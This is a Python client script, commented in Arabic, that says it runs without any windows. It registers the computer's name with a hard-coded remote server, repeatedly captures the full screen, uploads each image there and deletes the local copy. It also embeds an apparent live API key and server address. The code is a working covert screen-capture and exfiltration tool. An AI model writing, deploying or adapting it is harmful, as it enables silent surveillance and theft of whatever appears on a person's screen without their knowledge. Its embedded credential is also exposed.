#!/usr/bin/env python3
"""
ProjectSender Client - Auto Mode
يبدأ التقاط الصور مباشرة بدون أي نوافذ
"""

import os
import json
import time
import requests
import psutil
from PIL import ImageGrab
from pathlib import Path
from datetime import datetime

class AutoClient:
    def __init__(self, server_url, exe_id, user_api_key):
        self.server_url = server_url.rstrip('/')
        self.exe_id = exe_id
        self.user_api_key = user_api_key
        self.client_id = None
        self.page_name = None
        self.photo_count = 0
        self.delay = 1.0
        self.screenshot_dir = Path("screenshots")
        self.screenshot_dir.mkdir(exist_ok=True)
        
    def get_exe_config(self):
        """الحصول على إعدادات EXE من الخادم"""
        try:
            url = f"{self.server_url}/api/exe_config/{self.exe_id}"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                config = response.json()
                self.page_name = config.get('page_name', 'unknown')
                self.photo_count = config.get('photo_count', 50)
                self.delay = config.get('delay', 1.0)
                print(f"✅ Config loaded: {self.page_name} ({self.photo_count} photos)")
                return True
            else:
                print(f"❌ Failed to get config: {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ Error getting config: {e}")
            return False
    
    def register_client(self):
        """تسجيل العميل على الخادم"""
        try:
            computer_name = os.getenv('COMPUTERNAME', 'Unknown')
            
            url = f"{self.server_url}/api/register"
            data = {
                "computer_name": computer_name,
                "display_name": self.page_name
            }
            headers = {"X-API-Key": self.user_api_key}
            
            response = requests.post(url, json=data, headers=headers, timeout=10)
            
            if response.status_code == 200:
                result = response.json()
                self.client_id = result.get('client_id')
                print(f"✅ Client registered: {self.client_id}")
                return True
            else:
                print(f"❌ Registration failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ Error registering: {e}")
            return False
    
    def send_heartbeat(self):
        """إرسال نبض دوري"""
        try:
            url = f"{self.server_url}/api/heartbeat"
            data = {
                "client_id": self.client_id,
                "status": "capturing",
                "task": "screenshot"
            }
            headers = {"X-API-Key": self.user_api_key}
            
            requests.post(url, json=data, headers=headers, timeout=5)
        except:
            pass
    
    def capture_screenshot(self, index):
        """التقاط صورة"""
        try:
            screenshot = ImageGrab.grab()
            filename = f"{self.page_name}_{index:03d}_{int(time.time())}.png"
            filepath = self.screenshot_dir / filename
            screenshot.save(filepath)
            return str(filepath)
        except Exception as e:
            print(f"❌ Error capturing screenshot: {e}")
            return None
    
    def upload_screenshot(self, filepath):
        """رفع الصورة إلى الخادم"""
        try:
            url = f"{self.server_url}/api/upload_screenshot"
            
            with open(filepath, 'rb') as f:
                files = {'file': f}
                data = {
                    'client_id': self.client_id,
                    'page_name': self.page_name
                }
                headers = {"X-API-Key": self.user_api_key}
                
                response = requests.post(url, files=files, data=data, headers=headers, timeout=30)
                
                if response.status_code == 200:
                    os.remove(filepath)
                    return True
                else:
                    print(f"❌ Upload failed: {response.status_code}")
                    return False
        except Exception as e:
            print(f"❌ Error uploading: {e}")
            return False
    
    def start_capture(self):
        """بدء التقاط الصور"""
        print(f"🎬 Starting capture: {self.page_name}")
        print(f"📊 Photos: {self.photo_count}, Delay: {self.delay}s")
        
        for i in range(1, self.photo_count + 1):
            try:
                # التقاط الصورة
                filepath = self.capture_screenshot(i)
                if filepath:
                    print(f"📸 Captured: {i}/{self.photo_count}")
                    
                    # رفع الصورة
                    if self.upload_screenshot(filepath):
                        print(f"✅ Uploaded: {i}/{self.photo_count}")
                    
                    # إرسال نبض
                    self.send_heartbeat()
                
                # الانتظار
                time.sleep(self.delay)
                
            except KeyboardInterrupt:
                print("\n⏹️ Capture stopped by user")
                break
            except Exception as e:
                print(f"❌ Error in capture loop: {e}")
                time.sleep(1)
        
        print("✅ Capture completed!")
    
    def run(self):
        """تشغيل العميل"""
        print("🚀 ProjectSender Client - Auto Mode")
        print(f"📡 Server: {self.server_url}")
        print(f"🔑 EXE ID: {self.exe_id}")
        
        # الحصول على الإعدادات
        if not self.get_exe_config():
            print("❌ Failed to get config")
            return
        
        # تسجيل العميل
        if not self.register_client():
            print("❌ Failed to register")
            return
        
        # بدء التقاط الصور
        self.start_capture()

def main():
    # قراءة الإعدادات من متغيرات البيئة أو الملف
    server_url = os.getenv('SERVER_URL', 'https://sender-production-7ee8.up.railway.app')
    exe_id = os.getenv('EXE_ID', '99dbc3d3')
    user_api_key = os.getenv('USER_API_KEY', 'skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV')
    
    # إنشاء وتشغيل العميل
    client = AutoClient(server_url, exe_id, user_api_key)
    client.run()

if __name__ == "__main__":
    main()
